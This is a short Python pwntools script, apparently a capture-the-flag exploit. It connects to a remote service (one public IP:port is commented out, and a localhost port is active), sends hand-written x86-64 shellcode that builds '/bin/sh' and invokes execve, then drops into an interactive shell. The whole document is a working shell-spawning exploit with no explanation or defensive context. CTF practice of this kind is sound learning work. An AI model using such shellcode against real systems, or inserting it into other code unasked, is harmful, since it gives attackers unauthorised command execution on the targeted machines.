from pwn import *

# ip_port = "nc 61.147.171.105 61714".split(" ")
# p = remote(ip_port[-2], ip_port[-1])


ip_port = "127.0.0.1:51892".split(":")
io = remote(ip_port[-2], ip_port[-1])

# context.log_level = "debug"

shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\xB9\xBF\xF2\x66\x6B\x31\xC1\x55\x5E\x48\x83\xEE\x08\x31\xD2\x52\x50\x54\x5F\x52\xB8\x3B\x00\x00\x00\x89\x0D\x00\x00\x00\x00"


print(len(shellcode))

io.sendline(shellcode)

io.interactive()